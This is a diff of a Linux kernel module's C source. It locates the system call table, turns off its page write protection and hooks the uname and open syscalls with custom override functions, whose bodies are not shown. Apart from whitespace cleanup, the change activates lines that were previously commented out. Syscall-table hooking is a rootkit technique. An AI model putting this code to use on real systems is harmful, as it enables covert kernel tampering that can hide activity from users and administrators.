@@ -44,7 +44,7 @@ int make_ro(unsigned long address)
     unsigned int level;
     pte_t *pte = lookup_address(address, &level);
     pte->pte = pte->pte &~_PAGE_RW;
-   	printk(KERN_INFO "Address: 0x%lx set to ACCESS_RO\n", address);
+    printk(KERN_INFO "Address: 0x%lx set to ACCESS_RO\n", address);
     return 0;
 }
 
@@ -52,21 +52,23 @@ static int __init entry_point(void)
 {
     printk(KERN_INFO "[STATE]: Loading module into kernel space...\n");
 
-	kallsyms_on_each_symbol(prsyms_print_symbol, NULL);
-	printk(KERN_INFO "Got: %lx\n", table_addy);
+    kallsyms_on_each_symbol(prsyms_print_symbol, NULL);
+    printk(KERN_INFO "Got: %lx\n", table_addy);
 
     system_call_table_addr = (void*)table_addy;//ffffffff83a001c0;
-	printk(KERN_INFO "%lx", (unsigned long)system_call_table_addr);
+
+    printk(KERN_INFO "%lx", (unsigned long)system_call_table_addr);
     // Replace custom syscall with the correct system call name (write,open,etc) to hook.
     original_uname = system_call_table_addr[__NR_uname];
-	original_open  = system_call_table_addr[__NR_open];
+    original_open  = system_call_table_addr[__NR_open];
  
     // Disable page protection
-    //make_rw((unsigned long)system_call_table_addr);
+    make_rw((unsigned long)system_call_table_addr);
 	
     // Change syscall to our syscall function.
-    //system_call_table_addr[__NR_uname] = overide_uname;
-	//system_call_table_addr[__NR_open] = overide_open;
+    system_call_table_addr[__NR_uname] = overide_uname;
+    system_call_table_addr[__NR_open] = overide_open;
+
     printk(KERN_INFO "[STATE]: Module loaded into kernel space.\n");
     return 0;
 }
@@ -78,7 +80,7 @@ static void __exit exit_point(void)
     system_call_table_addr[__NR_open] = original_open;
  
     // Renable page protection.
-    //make_ro((unsigned long)system_call_table_addr);
+    make_ro((unsigned long)system_call_table_addr);
 
     printk(KERN_INFO "[STATE]: Module unloaded.\n");
 }
